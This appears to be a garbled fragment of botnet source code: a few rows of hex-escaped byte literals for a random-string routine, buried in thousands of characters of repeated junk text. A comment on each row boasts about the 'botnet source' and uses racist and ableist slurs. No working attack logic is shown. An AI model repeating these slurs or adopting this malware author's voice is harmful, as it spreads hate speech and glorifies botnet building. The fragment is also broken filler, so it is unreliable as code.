GFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGF